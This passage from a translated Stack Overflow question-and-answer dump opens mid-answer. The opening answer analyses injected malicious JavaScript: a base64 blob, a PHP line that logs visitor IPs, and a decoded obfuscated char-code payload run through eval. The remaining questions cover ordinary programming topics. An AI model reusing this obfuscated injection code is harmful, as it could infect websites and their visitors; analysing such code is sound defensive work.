Nyw5NSwyNiw0NSw4NywzMywxMDEsMTAxLDEwOCw5NCw4NiwzMyw5OCw5NiwxMDIsOTEsMTAxLDkyLDk3LDk1LDQ4LDI1LDgyLDg1LDEwMSw5Niw5NSwxMDMsMTAxLDg4LDI1LDQ0LDg5LDMyLDEwMCwxMDMsMTA3LDkzLDg4LDMyLDkzLDg4LDg4LDEwMSw0OCwyNSwzMywyNiw0NSw4NywzMywxMDEsMTAxLDEwOCw5NCw4NiwzMywxMDIsOTYsOTksNDcsMjQsMzUsMjUsNDQsODksMzIsMTAwLDg4LDEwMiw1MCwxMDMsMTAyLDk5LDkyLDg0LDEwMiwxMDMsODcsMjUsMjYsMTA1LDkwLDg3LDEwMiw4OSwyNiwzMCwyNCwzNiwzNCwyNCwyOCw0NSw4NywzMywxMDEsODYsMTAzLDUxLDEwMSwxMDMsMTAwLDkwLDg1LDEwMywxMDEsODgsMjYsMjQsOTEsODcsOTAsOTAsOTAsMTAxLDI2LDMwLDI0LDM2LDM0LDI0LDI4LDQ1LC0yLC00LC01LC02LDg3LDk3LDg0LDEwNCw5NSw4Niw5NywxMDIsMzEsOTAsODcsMTAxLDU2LDk0LDg2LDk2LDg3LDk1LDEwMywxMDEsNTEsMTA4LDcwLDgyLDkwLDY0LDgyLDk2LDg3LDI1LDI2LDg0LDk2LDg3LDEwNywyNCwyOCw3NywzMyw4MCwzMiw4Miw5OSw5OCw4Niw5Nyw4Niw1Miw5MSw5MSw5Myw4NywyNiw4NywyOCw0NSwtMiwtNCwtNSwxMTBdO313PWY7cz1bXTtyPVN0cmluZzt4PSJqJSI7Zm9yKGk9MDstaSs1NzkhPTA7aSs9MSl7aj1pO2lmKGUmJigwMzE9PTB4MTkpKXM9cytyLmZyb21DaGFyQ29kZSgoMSp3W2pdK2UoeCszKSsxMykpO30gdHJ5e2FzZ2FzZyYxM31jYXRjaChhc2dhKXtlKHMpO308L3NjcmlwdD4='));
    if ($fp = @fopen($dbf , "a")){fputs($fp , $ip.'|'); fclose($fp);}
} 
```

**第二阶段解码显示：**

```
try {
    abre++
} catch (a6ba34y) {
    try {
        prototype & 2
    } catch (asab) {
        e = window["e" + "v" + "al"];
    }
}
if (1) {
    f = [-4, - 5, 90, 89, 18, 25, 87, 97, 84, 104, 95, 86, 97, 102, 31, 90, 87, 101, 56, 94, 86, 96, 87, 95, 103, 101, 51, 108, 70, 82, 90, 64, 82, 96, 87, 25, 26, 84, 96, 87, 107, 24, 28, 77, 33, 80, 27, 108, 0, - 5, - 6, - 4, 91, 87, 101, 83, 94, 88, 100, 25, 28, 45, - 2, - 4, - 5, 110, 19, 87, 93, 102, 87, 17, 110, - 1, - 6, - 4, - 5, 85, 98, 85, 102, 96, 87, 95, 103, 32, 104, 101, 91, 101, 88, 26, 19, 47, 91, 87, 101, 83, 94, 88, 18, 100, 101, 85, 46, 26, 90, 101, 103, 98, 43, 34, 33, 102, 92, 107, 107, 94, 92, 99, 33, 87, 107, 104, 83, 31, 86, 97, 94, 34, 104, 84, 33, 98, 89, 99, 49, 88, 98, 47, 35, 26, 18, 104, 92, 86, 101, 91, 47, 24, 36, 34, 24, 19, 90, 86, 92, 89, 89, 103, 47, 24, 36, 34, 24, 19, 101, 101, 108, 94, 86, 48, 25, 103, 92, 101, 90, 85, 91, 93, 92, 102, 106, 45, 90, 90, 87, 86, 86, 97, 45, 97, 98, 101, 90, 103, 91, 96, 97, 44, 82, 85, 101, 96, 95, 103, 101, 88, 45, 93, 88, 88, 101, 45, 34, 44, 103, 97, 97, 45, 34, 44, 26, 48, 45, 34, 91, 87, 101, 83, 94, 88, 48, 19, 28, 45, - 2, - 4, - 5, 110, 0, - 5, - 6, 89, 103, 95, 86, 102, 90, 98, 96, 17, 92, 88, 99, 84, 95, 86, 101, 26, 26, 110, - 1, - 6, - 4, - 5, 103, 84, 100, 17, 89, 18, 46, 19, 86, 96, 86, 103, 94, 88, 96, 101, 33, 85, 99, 88, 83, 101, 88, 55, 93, 88, 95, 86, 97, 102, 25, 26, 91, 87, 101, 83, 94, 88, 25, 26, 46, 88, 31, 102, 87, 101, 52, 102, 101, 101, 91, 83, 104, 102, 86, 27, 25, 100, 101, 85, 24, 31, 25, 89, 103, 102, 97, 45, 33, 32, 104, 91, 106, 109, 93, 91, 101, 32, 86, 109, 103, 82, 33, 85, 96, 96, 33, 103, 86, 32, 97, 91, 98, 48, 90, 97, 46, 37, 25, 26, 46, 88, 31, 102, 102, 106, 95, 87, 31, 105, 91, 100, 92, 84, 90, 95, 91, 101, 108, 47, 24, 91, 91, 85, 87, 87, 95, 26, 45, 87, 33, 101, 101, 108, 94, 86, 33, 98, 96, 102, 91, 101, 92, 97, 95, 48, 25, 82, 85, 101, 96, 95, 103, 101, 88, 25, 44, 89, 32, 100, 103, 107, 93, 88, 32, 93, 88, 88, 101, 48, 25, 33, 26, 45, 87, 33, 101, 101, 108, 94, 86, 33, 102, 96, 99, 47, 24, 35, 25, 44, 89, 32, 100, 88, 102, 50, 103, 102, 99, 92, 84, 102, 103, 87, 25, 26, 105, 90, 87, 102, 89, 26, 30, 24, 36, 34, 24, 28, 45, 87, 33, 101, 86, 103, 51, 101, 103, 100, 90, 85, 103, 101, 88, 26, 24, 91, 87, 90, 90, 90, 101, 26, 30, 24, 36, 34, 24, 28, 45, - 2, - 4, - 5, - 6, 87, 97, 84, 104, 95, 86, 97, 102, 31, 90, 87, 101, 56, 94, 86, 96, 87, 95, 103, 101, 51, 108, 70, 82, 90, 64, 82, 96, 87, 25, 26, 84, 96, 87, 107, 24, 28, 77, 33, 80, 32, 82, 99, 98, 86, 97, 86, 52, 91, 91, 93, 87, 26, 87, 28, 45, - 2, - 4, - 5, 110];
}
w = f;
s = [];
r = String;
x = "j%";
for (i = 0; - i + 579 != 0; i += 1) {
    j = i;
    if (e && (031 == 0x19)) s = s + r.fromCharCode((1 * w[j] + e(x + 3) + 13));
}
try {
    asgasg & 13
} catch (asga) {
    e(s);
} 
```

然后通过 Javascript Packer 进一步混淆了有效负载。对于那些有兴趣看到这个功能的人，我会在下午晚些时候再玩这个......

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-12T15:59:48.850

如果您使用的是 PHP，您可以只使用标头重定向，那么您不必担心 JavaScript 漏洞：

```
header('Location: http://www.example.com/'); 
```

这必须在任何内容输出到 DOM 之前进行。如果 SEO 是一个因素，您也可以考虑使用 .htaccess 重定向。

# javascript - Javascript使用变量设置属性

> ID：12392109
> 
> 赞同：2
> 
> 时间：2012-09-12T15:56:21.797
> 
> 标签：javascript

我不确定这里的语法，但到目前为止我的代码是这样的......（注意：我以'#begmile'，'#endmile'，'#totmile'的形式传递三个文本框的ID，我想将“totmile”复选框的值设置为 endmile-bigmile）

```
function subtract(begmile, endmile, totmile){
y=$(begmile).attr('value');
z=$(endmile).attr('value');
y=z-y;
$(totmile).setAttr('value',???); 
```

}

我不确定到目前为止我的语法是否正确，但假设它是正确的（y 正确设置为 endmile-begmile，我如何使用 setAttr 将 totmile 的值设置为 y 的值？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T15:58:10.973

这是正确的语法：

```
var href = 'http://cnn.com';

$(selector).attr('href', href); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T15:58:35.373

你的最后一行没有调用正确的方法：

```
$(totmile).setAttr('value',???); 
```

应该：

```
$(totmile).attr('value',???); 
```

例如

```
$(totmile).attr('value', y);//set the value to the variable "y" 
```

您也可以调用`.val();`来轻松获取字段的值，或`.val(newValue);`设置值。

另请注意，如果您的“y”和“z”值实际上并不代表数字，您将得到一个奇怪的结果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:00:00.813

该`value`属性是指文本框的默认值，而不是当前值。当前的存储在`value` *属性*中。

```
function subtract(begmile, endmile, totmile) {
    document.getElementById(totmile).value =
      document.getElementById(endmile).value - document.getElementById(begmile).value;
} 
```

这也消除了对 jQuery 的需求，因为 JavaScript Sledgehammer 对于这项工作来说太过分了。为确保它正常工作，只需`#`在将 ID 传递给函数时删除。

# sql - SQL批量字符串操作

> ID：12392111
> 
> 赞同：2
> 
> 时间：2012-09-12T15:56:23.767
> 
> 标签：sql, database, oracle

我正在使用 oracle DB，需要在其中操作字符串列。该列包含多个采用以下格式的电子邮件地址：

jgooooll@gmail.com;dhookep@gmail.com;amoore@outlook.com

我想要做的是取出最后**没有**'@gmail.com'的任何东西（在这个例子中 amoore@outlook.com 将被删除）但是 amoore@outlook.com 可能是下一行的第一封电子邮件列，所以这样没有真正的固定格式，唯一的格式是每个地址用分号分隔。

无论如何，是否可以通过一个命令来实现这一点，以遍历列中的每一行并删除不是@gmail.com 的任何内容？我不太确定这种处理在 SQL 中是否可行。只是在寻找你的想法！

非常感谢你们。期待您的来信！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-12T16:49:43.197

仅适用于 Oracle 11g (11.2) 及更高版本。因为`listagg`该功能仅在 11.2 及以后版本中受支持。如果您使用 10.1 到 11.1，您可以编写自己的字符串聚合函数或使用[这个](http://asktom.oracle.com/pls/apex/f?p=100:11:0%3a%3a%3a%3aP11_QUESTION_ID:2196162600402)。

```
with T1 as (
  select 1 id, 'jhd@jk.com;jgooooll@gmail.com;dhookep@gmail.com;amoore@outlook.com' emails from dual union all
  select 2 id, 'jhd@jk.com;jgooooll@gmail.com;dhookep@gmail.com;amoore@outlook.com' emails from dual 
) 

select id
     , listagg(email, ';') within group(order by id) emails
  from (select id 
             , regexp_substr(emails,'[^;]+', 1, rn) email 
          from t1 
         cross join (select rownum rn
                       from(select max (regexp_count(emails, '[^;]+')) ml
                              from t1
                            )
                           connect by level <= ml      
                      )
         )                             
where email like '%@gmail.com%'
group by id

Id               Emails 
--------------------------------------
1     dhookep@gmail.com;jgooooll@gmail.com 
2     dhookep@gmail.com;jgooooll@gmail.com 
```

这是一个[**演示**](http://www.sqlfiddle.com/#!4/9d4ed/1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:20:22.730

这个答案实际上是针对 SQL Server 的，因为这就是我所知道的。话虽如此，也许有一个如何在一个系统中执行此操作的示例将使您了解如何在您的系统中执行此操作。或者也许有一种方法可以将代码转换为 Oracle 中相同类型的东西。

一、思考过程： 在 SQL Server 中结合`FOR XML PATH`和`STUFF`功能允许您制作一个逗号分隔的列表。我在其中添加了一个`WHERE Split.SplitValue LIKE ...`子句以将其过滤为仅 gmail 地址。我将整个事情交叉应用到主表中，并将其转换为过滤后的电子邮件列表。然后，您可以进一步过滤主表以在更有针对性的一组行上运行它。

二、SQL Server实现：

```
SELECT
    *
FROM @Table Base
CROSS APPLY 
(
    SELECT
        STUFF(
            (SELECT
                ';' + Split.SplitValue AS [text()]
            FROM dbo.fUtility_Split(Base.Emails, ';') Split
            WHERE Split.SplitValue LIKE '%@gmail.com'
            FOR XML PATH (''))
        , 1, 1, '') Emails
) FilteredEmails 
```

编辑：我忘了提到这个答案需要你有某种函数来根据分隔符值拆分字符串列。如果你还没有那个，然后谷歌它。有很多例子。

# sqlite - 如何优化 SQLite 索引以进行查询

> ID：12392117
> 
> 赞同：0
> 
> 时间：2012-09-12T15:56:37.307
> 
> 标签：sqlite

我有一个 SQLite 表

```
CREATE TABLE T(
    CategoryCode NVARCHAR(64) NOT NULL,
    DateTime     DateTime NOT NULL,
    ItemCode     NVARCHAR(64) NOT NULL,
    ItemName     NVARCHAR(64) NOT NULL,
    ItemValue    NUMERIC(28, 4) NOT NULL
) 
```

问题是如何优化以下查询的索引：

```
SELECT
 CategoryCode
,ItemCode
,ItemName
,SUM(ItemValue) as TotalValue
FROM T
WHERE CategoryCode = 'Code1' 
AND DateTime < '2012-01-04 00:00:00'
GROUP BY ItemCode 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T15:58:59.410

对于确切的查询，您需要在`T(CategoryCode, DateTime)`or上建立索引`T(DateTime, CategoryCode)`，具体取决于哪一列比另一列更具选择性。

但是，如果没有更全面地了解对表的所有访问，为单个查询创建索引是不明智的。

例如，您可能会发现，如果表中的大多数数据都有，`CategoryCode = 'Code1'`那么索引应该只在`DateTime`列上创建。

# api - Foursquare 消费者详情页面中的“发送测试推送”到哪里去了？

> ID：12392120
> 
> 赞同：2
> 
> 时间：2012-09-12T15:57:00.080
> 
> 标签：api, push, real-time, foursquare

我可以发誓几周前有这个选项，现在我再也看不到它了。我只是找错地方了，还是没有办法通过消费者详细信息页面发送测试推送？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T21:09:28.880

最近刷新了消费者详情页面，不小心漏掉了这个选项。它很快就会被添加回来。

# c# - Winforms - 点击控件的 WM_NCHITEST 消息

> ID：12392125
> 
> 赞同：2
> 
> 时间：2012-09-12T15:57:08.210
> 
> 标签：c#, .net, winforms, wndproc

我有一个简单的窗体，没有边框和几个标签控件（不需要单击）。我需要能够允许用户通过单击表单上的任意位置来移动表单，所以我发现[了这个](https://stackoverflow.com/a/30241/1324019)问题，并使用了在那里找到的以下代码。

```
 private const int WM_NCHITTEST = 0x84;
    private const int HTCLIENT = 0x1;
    private const int HTCAPTION = 0x2;

    protected override void WndProc(ref Message m)
    {
        switch (m.Msg) {
            case WM_NCHITTEST:
                base.WndProc(ref m);

                if ((int)m.Result == HTCLIENT) {
                    m.Result = (IntPtr)HTCAPTION;
                    return;
                } else {
                    return;
                }
                break;
        }
        base.WndProc(ref m);            
    } 
```

这很好用......在一定程度上。如果我单击表单本身（背景）上的任何位置，`WM_NCHITTEST`is `HTCLIENT`，那么我可以按预期移动我的表单。但是，如果我单击标签控件本身，则消息是不同的，我无法分辨它是什么。

我发现[这篇](http://msdn.microsoft.com/en-us/library/windows/desktop/ms645618%28v=vs.85%29.aspx)关于各种可能值的文章，`WM_NCHITTEST`但似乎都不是我需要的。

我意识到我可以禁用我所有的标签控件，这将允许我单击“打开”它们，就好像它是表单本身一样，但我想知道是否有更好/不同的方法来做到这一点。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T16:22:37.323

您正在覆盖`WndProc`表单，但是当光标位于标签上时，`WM_NCHITTEST`消息将发送到标签。

您可以创建自己的标签控件，该控件源自`Label`并覆盖其`WndProc`. 这应该总是返回`HTTRANSPARENT`以响应`WM_NCHITTEST`. 就像是：

```
private const int HTTRANSPARENT = -1;

protected override void WndProc(ref Message m)
{
    switch (m.Msg)
    {
        case WM_NCHITTEST:
            m.Result = (IntPtr)HTTRANSPARENT;
            return;
    }
    base.WndProc(ref m);
} 
```

另请注意，您的`WndProc`. 如果消息是`WM_NCHITTEST`但区域不是`HTCLIENT`，那么您调用基类两次。

# kinect - 使用 kinect 跟踪移动物体的最小工作距离

> ID：12392126
> 
> 赞同：0
> 
> 时间：2012-09-12T15:57:15.010
> 
> 标签：kinect

我想知道 Kinect 的最小工作距离是多少。

我想跟踪`10cm x 10cm`距离为 的移动物体 ( ) `1m`。物体将要移动的区域是`120cm x 60cm`。

鉴于 Kinect 的规格，是否可以在整个区域内跟踪对象？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:11:36.710

[维基百科说](http://en.wikipedia.org/wiki/Kinect#Technology)：

> 传感器具有水平 57° 和垂直 43° 的视场角

所以你的问题的答案是：不，120厘米太宽了。由于 1m 处的最大水平视场为[tan(57deg/2)*2](https://www.google.com/search?q=tan%2857deg/2%29%2a2) = ~1.08m

虽然距离约为 1.2m，但它应该可以工作（[tan(57deg/2)*2*1.2](https://www.google.com/search?q=tan%2857deg/2%29%2a2%2a1.2) = ~1.3m）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:18:16.667

传感器处理的距离范围**最小**为 850 毫米，**最大**为 4000 毫米，所以这应该是可能的。

我强烈建议您观看[Kinect SDK 快速入门视频](http://channel9.msdn.com/Series/KinectSDKQuickstarts)，因为它涵盖了所有基础知识以帮助您入门。事实上，[“使用深度数据”](http://channel9.msdn.com/Series/KinectSDKQuickstarts/Working-with-Depth-Data)可能包含您正在寻找的那种信息。

# perl - 在 Perl 中构建和打印多维列表而无需循环

> ID：12392127
> 
> 赞同：0
> 
> 时间：2012-09-12T15:57:21.907
> 
> 标签：perl, multidimensional-array

这篇文章的最佳答案：[如何在 Perl 中创建多维数组？](https://stackoverflow.com/questions/317310/how-can-i-create-multidimensional-arrays-in-perl)建议构建一个多维数组，如下所示：

```
my @array = ();
foreach my $i ( 0 .. 10 ) {
  foreach my $j ( 0 .. 10 ) {
    push @{ $array[$i] }, $j;
  }
} 
```

我想知道是否有一种方法可以更紧凑地构建数组并避免嵌套循环，例如使用类似：

```
my @array = ();
my @other_array = (0 ... 10);
foreach my $i ( 0 .. 10 ) {
    $array[$i] = @other_array; # This does not work in Perl
  }
} 
```

Perl 是否支持任何类似的语法来**构建**没有嵌套循环的多维数组？

同样，有没有办法在没有（嵌套）循环的情况下**打印多维数组？**

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T16:09:03.973

有不止一种方法可以做到：

## 生成

**[`push`](http://perldoc.perl.org/functions/push.html)接受`LIST`_**

```
my @array;
push @{$array[$_]}, 0 .. 10 for 0 .. 10; 
```

替代语法：

```
my @array;
push @array, [ 0 .. 10 ] for 0 .. 10; 
```

**[`map`](http://perldoc.perl.org/functions/map.html)秀色可餐**

```
my @array = map { [ 0 .. 10 ] } 0 .. 10; 
```

替代语法：

```
my @array = map [ 0 .. 10 ], 0 .. 10; 
```

## 印刷

**以最小的循环**

```
print "@$_\n" for @array; 
```

**在 Perl 5.10+ 上**

```
use feature 'say';
say "@$_" for @array; 
```

**具有更多格式控制**

```
print join( ', ', @$_ ), "\n" for @array;   # "0, 1, 2, ... 9, 10" 
```

**“没有循环”** （循环对你隐藏）

```
use Data::Dump 'dd';
dd @array; 
```

**`Data::Dumper`**

```
use Data::Dumper;
print Dumper \@array; 
```

* * *

查看[`perldoc perllol`](http://perldoc.perl.org/perllol.html)更多详细信息

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T15:59:03.963

你很接近，你需要一个对另一个数组的引用

```
my @array;  # don't need the empty list
my @other_array = (0 ... 10);
foreach my $i ( 0 .. 10 ) {
    $array[$i] = \@other_array;
    # or without a connection to the original
    $array[$i] = [ @other_array ];
    # or for a slice
    $array[$i] = [ @other_array[1..$#other_array] ];
  }
} 
```

您还可以使用`[]`列表周围的方括号直接进行匿名（未命名）数组引用。

```
my @array;
foreach my $i ( 0 .. 10 ) {
    $array[$i] = [0..10];
  }
} 
```

编辑：使用后缀打印可能是最简单的`for`

```
print "@$_\n" for @array; 
```

对于数值多维数组，您可以使用[`PDL`](http://pdl.perl.org). 它有几个针对不同用例的构造函数。与上述类似的是`xvals`. 请注意，PDL 对象重载打印，因此您可以将它们打印出来。

```
use PDL;
my $pdl = xvals(11, 11);
print $pdl; 
```

# java - 是否有将内容保存到数据库而不是内存的 Map 实现？

> ID：12392129
> 
> 赞同：7
> 
> 时间：2012-09-12T15:57:31.877
> 
> 标签：java, caching, out-of-memory, mongodb-java, map

> **可能重复：**
> [它们是 Java Map 的任何体面的磁盘实现吗？](https://stackoverflow.com/questions/4815633/are-they-any-decent-on-disk-implementations-of-javas-map)

我有一段代码（我没有编写）将数百万个 CSV 行读取到 Map，然后对其进行处理。

我到了我只是用完RAM的地步

我的选择是

1.  重写代码，尝试流式传输数据，但是因为某些计算可能需要整个数据集（例如，可能需要数据集中的第一行和最后一行的计算）

2.  编写一个实现`java.util.Map`但会将数据持久保存到数据库中的类

3.  只需重写代码并直接从数据库中插入/选择，但我宁愿先尝试#2

所以我突然想到了一个由数据库支持的 Map 的想法，所以在开始编写它之前，我想问一下这个问题是否有众所周知的模式/实现（甚至可能没有 Map）

现在，尽管我喜欢编写代码，但我不喜欢重新发明东西，我更喜欢重用开源代码。

我不太介意存储实现，SQL 或 NoSQL，但它需要允许 Map 自动持久化，并避免将其完全保存在内存中。

有这样一个已知的库/实现吗？这个问题熟悉吗？我是否以正确的方式攻击它？

* * *

**更新：**

根据评论，我将研究这些（较旧但几乎重复的）问题：

*   [它们是Java Map 的任何体面的磁盘实现吗？](https://stackoverflow.com/questions/4815633/are-they-any-decent-on-disk-implementations-of-javas-map)

*   [基于磁盘的 HashMap](https://stackoverflow.com/questions/2654709/disk-based-hashmap)

如果他们回答了我的问题并且仍然是最新的，则投票关闭这个

**更新2：**

1.  这不是完全重复，我正在寻找数据库支持的持久性，其他问题更广泛（任何基于磁盘的实现）
2.  重复并不总是一件坏事，请在投票结束之前阅读 Jeff Atwood 的[这篇文章](https://blog.stackoverflow.com/2010/11/dr-strangedupe-or-how-i-learned-to-stop-worrying-and-love-duplication/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:07:40.597

许多键值存储提供 Map 接口。例如，[https://github.com/jankotek/JDBM3](https://github.com/jankotek/JDBM3)

另请参阅 SO 问题：

[键值存储建议](https://stackoverflow.com/questions/6639080/key-value-store-suggestion)

[Java基于磁盘的键值存储](https://stackoverflow.com/questions/8509638/java-disk-based-key-value-storage)

# javascript - node.js 是否提供了真正的数组实现？

> ID：12392132
> 
> 赞同：2
> 
> 时间：2012-09-12T15:57:47.500
> 
> 标签：javascript, arrays, node.js

我使用 node.js 作为我的服务器平台，我需要处理一个包含 65,000 个项目的**非稀疏**数组。

Javascript 数组不是真正的数组，但实际上是散列。索引访问伴随着将索引转换为字符串，然后进行哈希查找。[（请参阅http://www.crockford.com/javascript/survey.html](http://www.crockford.com/javascript/survey.html)中的数组部分 ）。

所以，我的问题是这个。node.js 是否实现了一个真正的数组？确实需要我们调整大小或删除项目的成本，但真正的随机访问没有任何 index-to-string-then-hash-lookup ？

谢谢。

**编辑**

我可能要求太多，但我的数组存储 Javascript 对象。不是数字。而且我不能把它分成许多类型的数组，每个数组都包含数字原语或字符串，因为对象有嵌套的子对象。尝试使用类型化数组将导致无法维护的代码。

**编辑2**

我肯定错过了什么。为什么它必须是全有或全无？没有真正数组的真正 Javascript 或没有 Javascript 优势的 C 样式扩展。拥有一个真正的 Javascript（无类型）对象数组是否与 Javascript 的本质相矛盾？Java 和 C#`List<Object>`基本上是我正在寻找的。C# 更接近于`List<DynamicObject>`.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-12T16:12:05.777

Node.js 具有[Javascript 类型的数组](https://developer.mozilla.org/en-US/docs/JavaScript_typed_arrays)：`Int8Array, Uint8Array, Int16Array, Uint16Array, Int32Array, Uint32Array, Float32Array`.

我认为他们是你所要求的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:07:28.957

Node.js 确实提供了一个可能是您正在寻找的[`Buffer`类：](http://nodejs.org/api/buffer.html#buffer_buffer)

> A`Buffer`类似于整数数组，但对应于 V8 堆外的原始内存分配。A`Buffer`无法调整大小。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:13:44.870

您想使用低级 JavaScript (LLJS) 以 C 风格直接操作所有内容。

[http://mbebenita.github.com/LLJS/](http://mbebenita.github.com/LLJS/)

请注意，根据上面的链接，LLJS 数组更像您正在寻找的数组（真正的 C 类数组），而不是 Javascript 数组。

Node.js 中有一个 LLJS 的实现可用，所以也许你不必编写自己的 node.js C 扩展。也许这个实现会成功：[https ://github.com/mbebenita/LLJS](https://github.com/mbebenita/LLJS)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:18:33.877

本质上不是，不是。

但是，根据您的专业水平，您可以使用 Node 的 C/C++ 扩展工具编写“真正的”数组扩展。见[http://nodejs.org/api/addons.html](http://nodejs.org/api/addons.html)

# php - 查询 MySQL 以根据页面的 url 回显列的值

> ID：12392133
> 
> 赞同：0
> 
> 时间：2012-09-12T15:57:47.680
> 
> 标签：php, mysql

我有一个页面设置来获取网址的最后一部分；IE：

```
$page = $_GET["page"];
echo 'The current page name is ' . '"' . $page . '"'; 
```

这将返回，例如：

> 当前页面名称为“协和海军武器站”

Concord 海军武器站是网址的最后一部分：

```
http://www.andsoforth.com/shortRedirect.php?page=Concord%20Naval%20Weapons%20Station 
```

我需要这个页面将用户转发到：

```
http://www.andsoforth.com/reports.php?page=concord 
```

`concord`在标题为`shortname`while的列中`Concord Naval Weapons Station`设置为与`longname`.

回顾一下：当用户点击页面时

```
http://www.andsoforth.com/shortRedirect.php?page=Concord%20Naval%20Weapons%20Station 
```

该页面需要查询表`sites`并将 url+ 的值交换`longname`为 url+`shortname`并将用户重定向到该页面。

我不知道该怎么做。任何关于我什至可以开始实现这一目标的建议或提示将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:03:41.797

您可以通过在 MySQL 数据库中使用 SELECT 查询来查找 WHERE longname = Concord Naval Weapons Station 并回显结果来执行此操作。这是一种相当低效的方法，如果有更多信息，我们可能会为您提供更好的答案。

# functional-testing - 测试套件执行 Jubula

> ID：12392134
> 
> 赞同：0
> 
> 时间：2012-09-12T15:57:55.030
> 
> 标签：functional-testing, jubula

我一直在研究 Jubulas 自动化功能测试工具并按照教程进行操作，但在我开始使用它之前就已经陷入困境。安装时提供的用户手册没有给出任何答案，我在专门针对 Jubula 的博客中找不到任何内容。

我的问题：我有我的测试套件，包含测试用例和步骤，所有设置都已准备就绪。我已经使用编辑器映射了我的对象。我已经启动了 AUT 并连接到它。我所要做的就是开始测试执行......我点击开始......没有任何反应。

Java 应用程序是可见的（它是一个简单的计算器），我可以与之交互。但是当我按下开始时，我没有得到任何对话框，这是根据教程应该发生的。

有没有人尝试过 Jubula 并遇到过这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T08:00:03.383

我想到了两件事。

1.  如果“启动测试套件”按钮被禁用，则意味着您在停止执行测试套件时仍然存在某种问题（例如，缺少数据或对象映射）。

2.  如果启用了“开始测试套件”按钮，那么可能只是您需要从下拉菜单中选择一个要执行的测试套件（通过单击绿色按钮旁边的小箭头打开）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-22T11:00:59.937

我认为这不是以前的答案。如果您收到测试失败报告或您的 Start Test Suite 按钮被禁用，那么这很明显。您可以在文档/博客中找到这些错误。

但！有两个错误没有留下任何特征；没有错误消息，日志中没有任何内容。

**1.) 如果存在版本不兼容**如果您从独立安装程序或 Eclipse 市场安装了 Jubula，那么它将起作用。但是如果你自己把它放在一起，那么你就可以冷混这些组件。我对这些问题有一个答案：

[Jubula 升级到 2.0 后无法识别正在运行的 AUT](https://stackoverflow.com/questions/17166572/jubula-doesn%C2%B4t-recognize-running-aut-after-upgrade-to-2-0/26611991#26611991)

**2.）如果您通过启动另一个 .exe 来误导您的 AUT 代理**它具有问题中提到的症状。发生这种情况是因为应用程序中启动了远程控制 (rc) 插件，并且 AUT 代理收到了有关启动的通知。它试图识别客户端（testexec）数据库中列出的 AUT 配置中的进程，但它错误地识别了它。

您可以通过将每个运行情况添加为数据库中的不同 AUT 配置来解决此问题。它主要是关于文件系统中的位置：关于从哪里启动 exec 进程。即：debug-local（来自 Eclipse 启动栏）、exported-local（用于 Delta-pack 导出）、QA-local（如果您的构建中有 PDE）等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-22T21:13:34.063

我有同样的问题，但至少我得到了一份关于测试失败的报告。在我为 AUT 指定了 JRE（此设置仅在您单击高级或专家按钮时显示）后，我的测试终于开始工作了。

# click - 如何使电容式触摸屏保持点击而不是释放点击？

> ID：12392136
> 
> 赞同：0
> 
> 时间：2012-09-12T15:57:56.013
> 
> 标签：click, touch, mouse, touchscreen

我有一个新的电容式触摸屏，当您将手指放在一个位置并按住它时……没有任何反应。

当您松开手指时，“鼠标按下”动作和“鼠标按下”动作同时发生。

当我将手指放在那里时，我需要调用“按下按钮”动作，当我松开时需要调用“按下按钮”动作。

和想法？

# jquery - 如何将 jQuery .data() 属性添加到下拉列表选项元素

> ID：12392138
> 
> 赞同：2
> 
> 时间：2012-09-12T15:58:03.307
> 
> 标签：jquery, html

我正在尝试使用 jQuerys .data() 将一些额外的数据添加到下拉列表上的元素，下拉列表正在填充属性并且我想要的 ID 在那里，但是当我尝试访问数据时显示并且未定义。

人口代码。

```
 $.each(tutorArray, function(index, item){
        var TID= item.T.Id        
        $.each(item.T.TimeList, function(ind, i) {
            $(ddl).append($('<option></option>').val(i.StartTime).html(i.StartTime + ' - ' + i.EndTime).data({
                TID: TID
            }));
        });
    }); 
```

访问代码

```
$(ddl).bind('change', function() {
        if($(this).val() != '') {

            var time = $(this).val(); 

            showConfirmRequestTutorCallDialogue(d, time, $(ddlDurationSelector).val(), $(this).data("TID"), $(ddlStudiesSelector).val())
        }
    }); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:06:22.773

您应该`data`以这种方式设置元素（[请参阅文档](http://api.jquery.com/data/#data1)）：

```
element.data("someKey", someValue); 
```

因此，您的人口代码可能如下所示：

```
$.each(tutorArray, function(index, item){
    var TID= item.T.Id        
    $.each(item.T.TimeList, function(ind, i) {
        var element = $('<option></option>');
        element.val(i.StartTime).html(i.StartTime + ' - ' + i.EndTime);
        element.data("TID", TID);
        $(ddl).append(element);
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:03:12.823

[http://api.jquery.com/data/#data-html5](http://api.jquery.com/data/#data-html5)

我会尝试为您的数据属性名称使用驼峰式大小写，因为文档显示 html 5 在处理属性时在幕后发挥了一些作用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-05-10T11:26:38.380

**具有上述方法的修改版本的解决方案**

